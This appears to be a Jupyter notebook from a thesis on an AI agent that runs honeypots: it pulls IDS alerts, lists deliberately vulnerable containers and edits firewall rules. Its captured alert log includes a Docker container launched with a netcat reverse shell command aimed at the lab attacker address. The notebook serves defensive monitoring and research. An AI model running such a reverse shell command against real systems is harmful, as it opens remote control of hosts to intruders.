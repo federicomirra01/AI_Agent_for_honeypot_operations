{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "d7adb3a7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<module 'tools.firewall_tools' from '/home/federico/Desktop/Thesis/AI_Agent_for_honeypot_operations/HoneypotAgentApp/MultiAgentArchitecture/tools/firewall_tools.py'>"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import importlib\n",
    "from tools import network_tools as network_tools\n",
    "from tools import firewall_tools as firewall_tools\n",
    "importlib.reload(network_tools)\n",
    "importlib.reload(firewall_tools)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "d8b4cac3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "alerts = await network_tools.get_alerts(time_window=5)\n",
    "len(alerts.get('security_events', []).get('alerts'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "407a1c8e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'security_events': {'alerts': [{'category': '',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 36030,\n",
       "    'flow_id': 2139992503996592,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:26:31 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 20400\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 3,\n",
       "    'signature': 'Root-Level File Access)',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:26:31.828074+0200'},\n",
       "   {'category': 'Attempted Information Leak',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 36030,\n",
       "    'flow_id': 2139992503996592,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:26:31 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 20400\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 1,\n",
       "    'signature': 'Root-Level File Discovery',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:26:31.828114+0200'},\n",
       "   {'category': '',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 36030,\n",
       "    'flow_id': 2139992503996592,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:26:31 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 20400\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 3,\n",
       "    'signature': 'Root-Level File Access)',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:26:31.828114+0200'},\n",
       "   {'category': 'Attempted Information Leak',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 36030,\n",
       "    'flow_id': 2139992503996592,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:26:31 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 20400\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 1,\n",
       "    'signature': 'Root-Level File Discovery',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:26:31.828729+0200'},\n",
       "   {'category': 'A Network Trojan was detected',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 36030,\n",
       "    'flow_id': 2139992503996592,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:26:31 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 20400\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 2,\n",
       "    'signature': 'Reverse Shell Detected - No Job Control',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:26:31.828729+0200'},\n",
       "   {'category': '',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 36030,\n",
       "    'flow_id': 2139992503996592,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:26:31 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 20400\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 3,\n",
       "    'signature': 'Root-Level File Access)',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:26:31.828729+0200'},\n",
       "   {'category': 'Potentially Bad Traffic',\n",
       "    'dest_ip': '172.20.0.2',\n",
       "    'dest_port': 3306,\n",
       "    'flow_id': 376813811695,\n",
       "    'payload': None,\n",
       "    'proto': 'TCP',\n",
       "    'severity': 2,\n",
       "    'signature': 'ET SCAN Suspicious inbound to mySQL port 3306',\n",
       "    'src_ip': '192.168.100.2',\n",
       "    'src_port': 39352,\n",
       "    'timestamp': '2025-10-14T13:26:56.131159+0200'},\n",
       "   {'category': 'Potentially Bad Traffic',\n",
       "    'dest_ip': '172.20.0.2',\n",
       "    'dest_port': 1433,\n",
       "    'flow_id': 91054884215924,\n",
       "    'payload': None,\n",
       "    'proto': 'TCP',\n",
       "    'severity': 2,\n",
       "    'signature': 'ET SCAN Suspicious inbound to MSSQL port 1433',\n",
       "    'src_ip': '192.168.100.2',\n",
       "    'src_port': 39352,\n",
       "    'timestamp': '2025-10-14T13:26:56.152272+0200'},\n",
       "   {'category': 'Attempted Information Leak',\n",
       "    'dest_ip': '172.20.0.2',\n",
       "    'dest_port': 161,\n",
       "    'flow_id': 110238570016926,\n",
       "    'payload': None,\n",
       "    'proto': 'TCP',\n",
       "    'severity': 3,\n",
       "    'signature': 'POSSBL PORT SCAN (NMAP -sS)',\n",
       "    'src_ip': '192.168.100.2',\n",
       "    'src_port': 39352,\n",
       "    'timestamp': '2025-10-14T13:26:56.156738+0200'},\n",
       "   {'category': 'Attempted Information Leak',\n",
       "    'dest_ip': '172.20.0.2',\n",
       "    'dest_port': 2375,\n",
       "    'flow_id': 396086261458152,\n",
       "    'payload': 'GET /showcase HTTP/1.1\\r\\nHost: 172.20.0.2:2375\\r\\nUser-Agent: curl/8.15.0\\r\\nAccept: */*\\r\\n\\r\\n',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 2,\n",
       "    'signature': 'ET INFO POSSIBLE Web Crawl using Curl',\n",
       "    'src_ip': '192.168.100.2',\n",
       "    'src_port': 42886,\n",
       "    'timestamp': '2025-10-14T13:26:57.813386+0200'},\n",
       "   {'category': '',\n",
       "    'dest_ip': '192.168.100.2',\n",
       "    'dest_port': 43034,\n",
       "    'flow_id': 1187501363902405,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nApi-Version: 1.48\\r\\nContent-Type: application/json\\r\\nDocker-Experimental: false\\r\\nOstype: linux\\r\\nServer: Docker/28.0.1 (linux)\\r\\nDate: Tue, 14 Oct 2025 11:27:00 GMT\\r\\nContent-Length: 821\\r\\n\\r\\n{\"Platform\":{\"Name\":\"Docker Engine - Community\"},\"Components\":[{\"Name\":\"Engine\",\"Version\":\"28.0.1\",\"Details\":{\"ApiVersion\":\"1.48\",\"Arch\":\"amd64\",\"BuildTime\":\"2025-02-26T10:41:19.000000000+00:00\",\"Experimental\":\"false\",\"GitCommit\":\"bbd0a17\",\"GoVersion\":\"go1.23.6\",\"KernelVersion\":\"6.17.1-2-cachyos\",',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 3,\n",
       "    'signature': 'Root-Level File Access)',\n",
       "    'src_ip': '172.20.0.2',\n",
       "    'src_port': 2375,\n",
       "    'timestamp': '2025-10-14T13:27:02.748828+0200'},\n",
       "   {'category': '',\n",
       "    'dest_ip': '192.168.100.2',\n",
       "    'dest_port': 43034,\n",
       "    'flow_id': 1187501363902405,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nApi-Version: 1.48\\r\\nContent-Type: application/json\\r\\nDocker-Experimental: false\\r\\nOstype: linux\\r\\nServer: Docker/28.0.1 (linux)\\r\\nDate: Tue, 14 Oct 2025 11:27:00 GMT\\r\\nContent-Length: 821\\r\\n\\r\\n{\"Platform\":{\"Name\":\"Docker Engine - Community\"},\"Components\":[{\"Name\":\"Engine\",\"Version\":\"28.0.1\",\"Details\":{\"ApiVersion\":\"1.48\",\"Arch\":\"amd64\",\"BuildTime\":\"2025-02-26T10:41:19.000000000+00:00\",\"Experimental\":\"false\",\"GitCommit\":\"bbd0a17\",\"GoVersion\":\"go1.23.6\",\"KernelVersion\":\"6.17.1-2-cachyos\",',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 3,\n",
       "    'signature': 'Root-Level File Access)',\n",
       "    'src_ip': '172.20.0.2',\n",
       "    'src_port': 2375,\n",
       "    'timestamp': '2025-10-14T13:27:02.855818+0200'},\n",
       "   {'category': '',\n",
       "    'dest_ip': '192.168.100.2',\n",
       "    'dest_port': 43040,\n",
       "    'flow_id': 2055929080063658,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nApi-Version: 1.48\\r\\nContent-Type: application/json\\r\\nDocker-Experimental: false\\r\\nOstype: linux\\r\\nServer: Docker/28.0.1 (linux)\\r\\nDate: Tue, 14 Oct 2025 11:27:03 GMT\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1251\\r\\n{\"Id\":\"01513d25b1a2f61ced83e460314d69c2cc00ed5270840f27edaf54e48148e99d\",\"Created\":\"2025-10-14T11:27:02.749165929Z\",\"Path\":\"sh\",\"Args\":[\"-c\",\"/usr/bin/nc 192.168.100.2 4444 -e /bin/sh\"],\"State\":{\"Status\":\"exited\",\"Running\":false,\"Paused\":false,\"Restarting\":false,\"OOMKilled\":false,\"Dea',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 3,\n",
       "    'signature': 'Root-Level File Access)',\n",
       "    'src_ip': '172.20.0.2',\n",
       "    'src_port': 2375,\n",
       "    'timestamp': '2025-10-14T13:27:03.217481+0200'},\n",
       "   {'category': 'access to a potentially vulnerable web application',\n",
       "    'dest_ip': '172.20.0.2',\n",
       "    'dest_port': 2375,\n",
       "    'flow_id': 2055929080063658,\n",
       "    'payload': 'GET /v1.48/containers/01513d25b1a2f61ced83e460314d69c2cc00ed5270840f27edaf54e48148e99d/json HTTP/1.1\\r\\nHost: 172.20.0.2:2375\\r\\nUser-Agent: docker-sdk-python/7.1.0\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept: */*\\r\\nConnection: keep-alive\\r\\n\\r\\nPOST /v1.48/containers/01513d25b1a2f61ced83e460314d69c2cc00ed5270840f27edaf54e48148e99d/wait HTTP/1.1\\r\\nHost: 172.20.0.2:2375\\r\\nUser-Agent: docker-sdk-python/7.1.0\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept: */*\\r\\nConnection: keep-alive\\r\\nContent-Length: 0\\r\\n\\r\\nDELETE /v1.48/',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 2,\n",
       "    'signature': 'GPL WEB_SERVER DELETE attempt',\n",
       "    'src_ip': '192.168.100.2',\n",
       "    'src_port': 43040,\n",
       "    'timestamp': '2025-10-14T13:27:03.231891+0200'},\n",
       "   {'category': '',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 43096,\n",
       "    'flow_id': 390209307890046,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:27:13 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 29844\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 3,\n",
       "    'signature': 'Root-Level File Access)',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:27:13.289646+0200'},\n",
       "   {'category': 'Attempted Information Leak',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 43096,\n",
       "    'flow_id': 390209307890046,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:27:13 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 29844\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 1,\n",
       "    'signature': 'Root-Level File Discovery',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:27:13.289695+0200'},\n",
       "   {'category': '',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 43096,\n",
       "    'flow_id': 390209307890046,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:27:13 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 29844\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 3,\n",
       "    'signature': 'Root-Level File Access)',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:27:13.289695+0200'},\n",
       "   {'category': 'Attempted Information Leak',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 43096,\n",
       "    'flow_id': 390209307890046,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:27:13 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 29844\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 1,\n",
       "    'signature': 'Root-Level File Discovery',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:27:13.289756+0200'},\n",
       "   {'category': 'A Network Trojan was detected',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 43096,\n",
       "    'flow_id': 390209307890046,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:27:13 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 29844\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 2,\n",
       "    'signature': 'Reverse Shell Detected - No Job Control',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:27:13.289756+0200'},\n",
       "   {'category': '',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 43096,\n",
       "    'flow_id': 390209307890046,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:27:13 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 29844\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 3,\n",
       "    'signature': 'Root-Level File Access)',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:27:13.289756+0200'},\n",
       "   {'category': '',\n",
       "    'dest_ip': '192.168.200.1',\n",
       "    'dest_port': 43096,\n",
       "    'flow_id': 390209307890046,\n",
       "    'payload': 'HTTP/1.1 200 OK\\r\\nServer: Werkzeug/3.1.3 Python/3.10.12\\r\\nDate: Tue, 14 Oct 2025 11:27:13 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 29844\\r\\nConnection: close\\r\\n\\r\\n{\"alerts\":[{\"category\":\"Potentially Bad Traffic\",\"dest_ip\":\"172.20.0.3\",\"dest_port\":3306,\"flow_id\":1151622773388408,\"payload\":null,\"proto\":\"TCP\",\"severity\":2,\"signature\":\"ET SCAN Suspicious inbound to mySQL port 3306\",\"src_ip\":\"192.168.100.2\",\"src_port\":60995,\"timestamp\":\"2025-10-14T13:25:32.399205+0200\"},{\"category\":\"Attempted I',\n",
       "    'proto': 'TCP',\n",
       "    'severity': 3,\n",
       "    'signature': 'Root-Level File Access)',\n",
       "    'src_ip': '192.168.200.2',\n",
       "    'src_port': 7000,\n",
       "    'timestamp': '2025-10-14T13:27:13.290477+0200'}],\n",
       "  'time_window_minutes': 2,\n",
       "  'timestamp': '2025-10-14T13:28:26.344726Z',\n",
       "  'total_events': 21}}"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "alerts = await network_tools.get_alerts(time_window=2)\n",
    "alerts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "e451dc46",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'honeypot_config': [{'id': '3d97bbc7e7b8',\n",
       "   'name': 'cve-2021-22205-gitlab-1-proxy',\n",
       "   'image': 'nginx:alpine',\n",
       "   'status': 'running',\n",
       "   'created': '2025-10-14T10:24:36.722830117Z',\n",
       "   'ports': ['80/tcp'],\n",
       "   'ip_address': '172.20.0.10'},\n",
       "  {'id': 'd5e7ad115690',\n",
       "   'name': 's2-057-struts2-1',\n",
       "   'image': 'vulhub/struts2:2.3.34-showcase',\n",
       "   'status': 'running',\n",
       "   'created': '2025-10-14T10:24:36.345390052Z',\n",
       "   'ports': ['8080/tcp'],\n",
       "   'ip_address': '172.20.0.3'},\n",
       "  {'id': '65c11d7f29b4',\n",
       "   'name': 'unauthorized-rce-docker-1',\n",
       "   'image': 'unauthorized-rce-docker:latest',\n",
       "   'status': 'running',\n",
       "   'created': '2025-10-14T10:24:36.043252751Z',\n",
       "   'ports': ['2375/tcp', '2376/tcp'],\n",
       "   'ip_address': '172.20.0.2'},\n",
       "  {'id': 'e2e7e2ac93a4',\n",
       "   'name': 'xdebug-rce-xdebug2-1',\n",
       "   'image': 'vulhub/php:7.1-xdebug',\n",
       "   'status': 'running',\n",
       "   'created': '2025-10-14T10:24:34.66538461Z',\n",
       "   'ports': ['80/tcp'],\n",
       "   'ip_address': '172.20.0.7'}]}"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "network_tools.get_docker_containers()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "2c190a51",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'firewall_status': 'up', 'suricata_status': 'up'}\n",
      "Chain FORWARD (policy DROP)\n",
      "num  target     prot opt source               destination         \n",
      "1    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0            state RELATED,ESTABLISHED\n",
      "2    ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0           \n",
      "3    ACCEPT     all  --  172.20.0.0/24        172.20.0.0/24       \n",
      "4    DROP       all  --  192.168.100.0/24     172.20.0.0/24       \n",
      "5    DROP       all  --  172.20.0.0/24        192.168.100.0/24    \n",
      "6    LOG        all  --  0.0.0.0/0            0.0.0.0/0            LOG flags 0 level 4 prefix \"FIREWALL-DROP: \"\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(network_tools.check_services_health())\n",
    "rules = await firewall_tools.get_firewall_rules()\n",
    "print(rules['firewall_config']['data']['rules'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "d1039a00",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tools.firewall_tools:Removing firewall rules: [1, 2]\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "{'rules_removed_current_epoch': ['REMOVED rule #1:    ACCEPT     tcp  --  172.20.0.8           192.168.100.0/24',\n",
       "  'REMOVED rule #2:    ACCEPT     tcp  --  192.168.100.0/24     172.20.0.8']}"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "await firewall_tools.remove_firewall_rule([1, 2])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 179,
   "id": "d953c024",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tools.firewall_tools:Adding allow rule: ALLOW 192.168.100.2/24 -> 172.20.0.10 (tcp)\n",
      "INFO:tools.firewall_tools:Adding allow rule: ALLOW 172.20.0.10 -> 192.168.100.2/24 (tcp)\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "{'rules_added_current_epoch': 'ALLOW 172.20.0.10 -> 192.168.100.2/24 (tcp)'}"
      ]
     },
     "execution_count": 179,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "honeypot_ip = '172.20.0.10' \n",
    "attacker_ip = '192.168.100.2/24'\n",
    "\n",
    "await firewall_tools.add_allow_rule(source_ip=attacker_ip, dest_ip=honeypot_ip, port=8080)\n",
    "await firewall_tools.add_allow_rule(source_ip=honeypot_ip, dest_ip=attacker_ip)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
